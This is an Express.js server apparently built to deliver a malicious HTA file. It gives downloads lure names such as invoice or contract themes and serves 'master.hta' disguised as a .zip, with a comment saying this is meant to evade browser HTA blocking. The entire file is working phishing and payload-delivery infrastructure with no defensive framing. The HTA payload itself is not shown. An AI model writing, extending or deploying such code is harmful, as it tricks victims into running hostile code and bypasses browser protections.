const express = require('express');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');

const app = express();
const port = process.env.PORT || 3000;

// ✅ CRITICAL: Dynamic routes MUST be defined BEFORE static middleware
// This ensures /payload/:filename is handled by our custom route, not 404'd by static files

// 1. THE BRIDGE - Generates unique filename and redirects
app.get('/bridge', (req, res) => {
    const randomId = crypto.randomInt(100000, 999999);
    const themes = ['Adobe_Document', 'Contract_Agreement', 'Invoice_Scan', 'Policy_Update', 'Secure_Form'];
    const theme = themes[Math.floor(Math.random() * themes.length)];
    const uniqueName = `${theme}_${randomId}.hta`;
    
    console.log(`[BRIDGE] Generated: ${uniqueName}`);
    res.redirect(`/confirm.html?file=${encodeURIComponent(uniqueName)}`);
});

// 2. THE PAYLOAD - Serves master.hta disguised as .zip
app.get('/payload/:filename', (req, res) => {
    const filePath = path.join(__dirname, 'public', 'master.hta');
    
    // Debug logging for Railway console
    console.log(`[PAYLOAD] Requested: ${req.params.filename}`);
    console.log(`[PAYLOAD] Resolved path: ${filePath}`);
    
    if (!fs.existsSync(filePath)) {
        console.error(`[PAYLOAD] ERROR: File not found at ${filePath}`);
        return res.status(404).send('Payload source file missing.');
    }

    // Serve as .zip to bypass browser HTA blocking
    const safeFilename = req.params.filename.replace('.hta', '.zip');
    
    console.log(`[PAYLOAD] Sending as: ${safeFilename}`);
    
    res.setHeader('Content-Disposition', `attachment; filename="${safeFilename}"`);
    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    
    res.sendFile(filePath, (err) => {
        if (err) {
            console.error(`[PAYLOAD] Send failed: ${err.message}`);
            if (!res.headersSent) res.status(500).send('Download failed.');
        } else {
            console.log(`[PAYLOAD] Success: ${safeFilename}`);
        }
    });
});

// 3. STATIC FILES - MUST BE AFTER dynamic routes
app.use(express.static(path.join(__dirname, 'public')));

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Start server with error handling
try {
    app.listen(port, () => {
        console.log(`✅ Server running on port ${port}`);
        console.log(`🔗 Test bridge: http://localhost:${port}/bridge`);
    });
} catch (error) {
    console.error('❌ Failed to start server:', error.message);
    process.exit(1);
}
